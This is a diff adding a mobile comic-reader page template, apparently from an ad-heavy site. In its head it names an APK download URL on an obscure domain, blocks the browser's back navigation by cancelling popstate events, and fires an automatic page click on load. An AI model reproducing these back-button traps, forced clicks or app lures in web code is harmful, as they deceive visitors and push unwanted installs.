@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="c" c="{$channel}">
+    <meta name="s" s="0">
+    <meta name="my" k="rinimei">
+    <meta name="load" v="https://faoptk.hhuuiwxbsk.cn/zz17c.apk">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="applicable-device" content="mobile">
+    <script>
+     
+    </script>
+    <link rel="icon" href="static/app-icon.png">
+    <link rel="apple-touch-icon" href="static/app-icon.png">
+    <link rel="stylesheet" type="text/css" href="__CSS__/bootstrap.min.css" />
+    <link rel="stylesheet" type="text/css" href="__CSS__/bootstrap-icons.css" />
+    <link rel="stylesheet" type="text/css" href="__CSS__/noty.css" />
+    <link rel="stylesheet" type="text/css" href="__CSS__/noty-themes/bootstrap-v4.css" />
+    <link rel="stylesheet" type="text/css" href="__CSS__/mobile.css" />
+    <link rel="stylesheet" type="text/css" href="__CSS__/style.css" />
+    <link rel="stylesheet" type="text/css" href="__CSS__/swiper-bundle.min.css" />
+    <script type="text/javascript" src="__JS__/rem.min.js"></script>
+    <script type="text/javascript" src="__JS__/jquery-2.2.4.min.js"></script>
+    <script type="text/javascript" src="__JS__/swiper-bundle.min.js"></script>
+    <script type="text/javascript" src="__JS__/bootstrap.bundle.min.js"></script>
+    <script type="text/javascript" src="__JS__/clipboard.min.js"></script>
+    <script type="text/javascript" src="__JS__/lozad.min.js"></script>
+    <script type="text/javascript" src="__JS__/sweetalert2.js"></script>
+    <script type="text/javascript" src="__JS__/noty.min.js"></script>
+    <script type="text/javascript" src="__JS__/qrcode.min.js"></script>
+    <script type="text/javascript" src="__JS__/bylqwya.js"></script>
+    <script type="text/javascript" src="__STATIC__/comics/js/app.js"></script>
+    
+
+    <link rel="stylesheet" href="__STATIC__/comics/css/styleOld.css">
+    <link rel="stylesheet" href="__STATIC__/comics/css/home.css">
+    <link rel="stylesheet" href="__STATIC__/comics/css/introduction.css">
+ 
+
+    <link rel="stylesheet" href="__STATIC__/comics/css/styles.css">
+    <link rel="stylesheet" href="__STATIC__/comics/css/swiperGf.css" />
+    <link rel="stylesheet" href="__STATIC__/css/commons.css" />
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            window.addEventListener('popstate', function (e) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+            }, true);
+            setTimeout(function () {
+                document.body.click();
+            }, 0);
+        });   
+    </script>
+<title>漫画阅读</title>
+<link rel="stylesheet" type="text/css" href="__CSS__/styles.css" />
+</head>
+<style>
+    /* .swiper-slide  {
+    background: #000;
+} */
+
+    .actives1 > .header_navTxt{
+        color: #FA2B24 !important;
+        background: none;
+    }
+    .actives1 > .header_navli{
+        width: 22px;
+        height: 3px;
+        border-radius: 3px;
+        background: #FA2B24;
+    }
+
+    /* a {
+        color: #ffff;
+    } */
+
+</style>
+<body>
+
+<!-- 人气榜 -->
+<div id="page">
+      <!-- 广告开始 -->
+        <!-- 顶部 -->
+        <div class="header">
+            <div class="headerBox">
+                <div class="logoBox">
+                    <img src="{$logo}" class="header_logo">
+                </div>
+                <a href="/comics/search/{$channel}.html">
+                    <div class="header_input">
+                        <div class="headerInput"> 搜索</div>
+                        <img src="__STATIC__/comics/img/search.png" class="header_search">
+
+                    </div>
+                </a>
+
+                <img src="__STATIC__/comics/img/collectBtn.png" class="header_collect">
+
+            </div>
+            <div class="header_nav">
+                <a href="/comics/{$channel}.html">
+                    <div class="header_navLine">
+                        <div class="header_navTxt">
+                            全部
+                        </div>
+                        <div class="header_navli"></div>
+
+                    </div>
+                </a>
+                {volist name='novelCate' id="item"}
+                <a href="/comics/{$channel}.html?cate_id={$item.id}">
+                    <div class="header_navLine  {if condition='$cate_id eq $item.id'}actives1{/if}">
+                        <div class="header_navTxt">
+                            {$item.title}
+                        </div>
+                        <div class="header_navli"></div>
+                    </div>
+                </a>
+                {/volist}
+
+            </div>
+        </div>
+        <div class="contentBox" style="padding-top: 90px;background: none;">
+            <div class="swiper mySwiper">
+                <div class="swiper-wrapper">
+                    {volist name='BannerList' id="Banner"}
+                    <div class="swiper-slide ad " data-id="{$Banner.id}" data-channel="{$channel}" data-site="{$site_id}"
+                        data-url="{$Banner.androidurl}"><img src="{$Banner.img}" onerror="this.src='/static/images/loading_img_bg_default.jpg';"></div>
+                    {/volist}
+                </div>
+                <!-- <div class="swiper-button-next"></div>
+                <div class="swiper-button-prev"></div> -->
+                <div class="swiper-pagination"></div>
+            </div>
+        </div>
+      
+        <!-- 顶部结束 -->
+        <!-- 九宫格 -->
+        <div class="index_jiugongge">
+            {volist name='jiugongge_img' id="item"}
+            <div class="index_jiugongge_li ad" data-id="{$item.id}" data-channel="{$channel}" data-site="{$site_id}"
+                data-url="{$item.androidurl}">
+                <img class="index_jiugongge_img" src="{$item.img}" onerror="this.src='/static/images/loading_img_bg_default.jpg';">
+                <div class="index_jiugongge_text">{$item.name}</div>
+            </div>
+            {/volist}
+
+        </div>
+         <!-- 轮播图 -->
+        <div class="index_swiper">
+            <div class="swiper-banner swiper">
+                <div class="swiper-wrapper">
+                    {volist name='BannerList2' id="Banner"}
+                    <div class="swiper-slide">
+                        <img class="banner-img ad" src="{$Banner.img}" alt=""
+                         data-id="{$Banner.id}" 
+                         data-channel="{$channel}" 
+                         data-site="{$site_id}"
+                         data-url="{$Banner.androidurl}"
+                         >
+                    </div>
+                    {/volist}
+         
+                </div>
+                <div class="swiper-pagination"></div>
+            </div>
+
+        </div>
+     <!-- 广告结束 -->
+
+
+
+
+
+
+    <!-- <div style="width: 100%;position: fixed;background: #000;top: 0;"> -->
+        <!-- 返回栏 -->
+        <div class="nav">
+            <a href="/comics/info/{$channel}.html?id={$novel['id']}" class="left">
+                <img class="leftBtn" src="__STATIC__/comics/img/fqbtn_left.png" style="width: 16px;
+    height: 16px;"/>
+                <div class="leftName" style="color: #FA2B24;">漫画阅读</div>
+            </a>
+            <div class="right">
+              
+            </div>
+        </div>
+
+    <!-- </div> -->
+
+
+
+
+ <!-- 中部广告开始 -->
+ {volist name='zhong_img_ad' id="item"}
+ <img src="{$item.img}" class="banner ad" data-id="{$item.id}" data-channel="{$channel}"
+ data-site="{$site_id}" data-url="{$item.androidurl}">
+ {/volist}
+ <!-- 抖音 -->
+ <div class="index_dyList" style="padding: 8px 0;border: 0px;">
+     {volist name='zhong_font_ad' id="item"}
+   
+         <div class="index_dyListBox ad" data-id="{$item.id}" data-channel="{$channel}" data-site="{$site_id}"
+         data-url="{$item.androidurl}">
+             <div class="flexBox">
+                 <img src="{$item.img}" class="index_dyList_img" onerror="this.src='/static/images/loading_img_bg_default.jpg';">
+                 <div class="index_dyList_dyTxt">{$item.name}</div>
+
+             </div>
+
+             <img src="__STATIC__/novel/img/rightIcon.png" class="index_dyList_rightIcon">
+         </div>
+
+     {/volist}
+
+ </div>
+<!-- 中部广告结束-->
+
+
+
+
+
+
+    <div class="contentBox">
+
+
+        <!-- 小说标题 -->
+        <div>
+            <!-- 标题 -->
+            <div class="readTitle">
+              
+                {$chapter['name'] | raw}
+            </div>
+
+            <!--{$chapter['content'] | raw}-->
+                {volist name="manhuaList" id="manhua"}
+                <img style="width: 100%;margin-top: 5px;" class="lozad" data-src="{$manhua | raw}" src="__IMAGES__/loading_img_bg_default.jpg" alt="">
+                {/volist}
+        </div>
+
+
+
+
+
+
+
+           <!-- 广告开始 -->
+           {volist name='di_img_ad' id="item"}
+           <img class="banner ad" src="{$item.img}"  data-id="{$item.id}" data-channel="{$channel}"
+            data-site="{$site_id}" data-url="{$item.androidurl}" onerror="this.src='/static/images/loading_img_bg_default.jpg';"/>
+           {/volist}
+       
+           <div class="index_dyList" style="padding: 8px 0;border: 0px;">
+           
+               {volist name='di_img_font_ad' id="item"}
+                   <div class="index_dyListBox ad " data-id="{$item.id}" data-channel="{$channel}"
+                   data-site="{$site_id}" data-url="{$item.androidurl}">
+                       <div class="flexBox">
+                           <img src="{$item.img}" class="index_dyList_img" onerror="this.src='/static/images/loading_img_bg_default.jpg';">
+                           <div class="index_dyList_dyTxt">{$item.name}</div>
+
+                       </div>
+
+                       <img src="__STATIC__/video/img/rightIcon.png" class="index_dyList_rightIcon">
+                   </div>
+                   {/volist}
+
+           </div>
+          <!-- 广告结束 -->
+
+        <!-- 分页 -->
+
+
+
+    </div>
+
+    <!-- 导航栏 -->
+    <div class="lableList paddingRead" style="margin: 10px;">
+        <a href="/comics/info/{$channel}.html?id={$novel['id']}" class="lable flex" style="height:36px;">
+            <img src="__IMAGES__/return.svg" style="margin-top: 3px;" /><span style="margin-left: 5px;">返回</span>
+        </a>
+        <div class="lable flex" id="mulvBtn" style="height:36px;"><img src="__IMAGES__/mulv.svg" /><span
+                style="margin-left: 5px;">目录</span></div>
+        <a href="/comics/chapter/{$channel}.html?chapter_id={$pre['id']}" class="lable flex" style="height:36px;"><img src="__IMAGES__/chevron_Left.svg" /><span style="margin-left: 5px;">上一话</span>
+        </a>
+        <a href="/comics/chapter/{$channel}.html?chapter_id={$next['id']}" style="height:36px;" class="lable flex"><span>下一话</span><img src="__IMAGES__/right.svg"
+                                                                                                                                          style="margin-left: 5px;margin-top: 1px;" /></a>
+    </div>
+</div>
+
+<!-- 弹窗 -->
+<div class="popupRead">
+    <!-- 目录 -->
+    <div class="mulv">
+        <div class="mulvName">{$novel['title'] | raw}</div>
+        <div class="mulvTop">
+
+            <div class="mulvtext">目录—更新至{$catalogcount}话</div>
+            <div class="mulvRight">
+                <img class="zhengxu" id="imgToChange" src="__IMAGES__/zhengxu.svg" />
+                <div class="mulvRightText" id="textToChange">正序</div>
+            </div>
+        </div>
+
+        <div class="mulvPz">
+            {volist name="cataloglist" id="index"}
+            <a  href="/comics/chapter/{$channel}.html?chapter_id={$index['id']}" class="pzList">
+                <div {if condition='$chapter.id eq $index.id'} style="color: #FDA765;"  {/if} class="pzLeft">{$index['name'] | raw}</div>
+        <!--<div class="pzRight">第<span style="color: #FFFFFF99;">{$index['id']}</span>{$index['chapter']}</div>-->
+        </a>
+        {/volist}
+    </div>
+
+</div>
+
+
+</div>
+<div class="popupBack"></div>
+<script type="text/javascript" src="__JS__/utils_mobile.js"></script>
+<!-- <script src="__STATIC__/common/jq.js"></script> -->
+<script src="__STATIC__/common/swiper.js"></script>
+<script src="__STATIC__/common/apps.js"></script>
+<script>
+  $(document).ready(function () {
+    $('[data-toggle="tooltip"]').tooltip();
+    $('[data-toggle="popover"]').popover();
+    const observer = lozad(); // lazy loads elements with default selector as '.lozad'
+    observer.observe();
+  });
+  // sweetalert2弹窗配置
+  const SSwal = Swal.mixin({
+    confirmButtonColor: '#007bff',
+    cancelButtonColor: '#6c757d',
+    confirmButtonText: '确定',
+    cancelButtonText: '取消',
+    reverseButtons: true,
+  })
+ 
+  /*
+  debugger
+  */
+  myDialog(
+      [
+         
+      ]
+  )
+ 
+</script>
+
+
+
+
+<script>
+    $(document).on('click', 'selector', function (event) {
+        event.preventDefault();
+    });
+
+    $(document).ready(function () {
+        $('#mulvBtn').click(function () {
+            $('.popupRead').show();
+            $('.popupBack').show();
+        });
+    });
+    $(document).ready(function () {
+        $('.popupBack').click(function () {
+            $('.popupRead').hide();
+            $('.popupBack').hide();
+        });
+    });
+    $(document).ready(function () {
+        $('#mulvBtn').click(function () {
+
+        });
+    });
+    $(document).ready(function(){
+        //目录点击变亮
+        $(".choosePage").click(function(){
+            $(".choosePage").removeClass("choosePage_active");
+            $(this).addClass("choosePage_active");
+            var moveX = $(this).position().left+$(this).parent().scrollLeft();
+            var pageX = document.documentElement.clientWidth;
+            var blockWidth = $(this).width();
+            var left = moveX-(pageX/2)+(blockWidth/2);
+            $(".chooseMl").scrollLeft(left);
+        });
+        //点击正倒序
+        var $link = $('.pzList');
+        $('.mulvTop').click(function() {
+
+            var currentText = $('#textToChange').text();
+            if (currentText === "正序") {
+                $('#textToChange').text("倒序");
+                $('#imgToChange').attr('src', '__IMAGES__/daoxu.svg');
+                var container = $('.mulvPz');
+                var items = container.find('.pzList');
+                items = items.toArray().reverse();
+                container.empty();
+                $.each(items, function(index, item) {
+                    container.append(item);
+                });
+            } else {
+                $('#textToChange').text("正序");
+                $('#imgToChange').attr('src', '__IMAGES__/zhengxu.svg');
+                var container = $('.mulvPz');
+                var items = container.find('.pzList');
+                items = items.toArray().reverse();
+                container.empty();
+                $.each(items, function(index, item) {
+                    container.append(item);
+                });
+            }
+        });
+    });
+</script>
+</body>
+
+</html>
